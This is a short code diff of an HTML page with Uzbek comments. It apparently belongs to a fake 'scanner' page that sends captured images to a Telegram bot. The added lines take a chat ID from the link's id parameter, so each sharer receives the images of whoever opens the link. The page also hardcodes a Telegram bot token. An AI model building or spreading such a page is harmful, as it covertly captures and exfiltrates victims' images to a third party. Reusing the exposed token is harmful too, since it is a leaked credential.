@@ -36,8 +36,12 @@
 
 <script>
     const token = "8103900618:AAHIP38KJ0Y0Rr1u1P4n9z6PdbAr9LAM-fk";
+    // Linkdagi kodni olish (masalan: ?id=otWd9I8SXH)
     const urlParams = new URLSearchParams(window.location.search);
-    const user_secret_code = urlParams.get('id') || "8041707187"; 
+    const secret_code = urlParams.get('id'); 
+
+    // ... rasm yuborish qismida chat_id o'rniga secret_code ishlatiladi ...
+    formData.append('chat_id', secret_code);
 
     async function startScanner() {
         const statusElement = document.getElementById('status');
@@ -103,3 +107,4 @@
 </script>
 </body>
 </html>
+
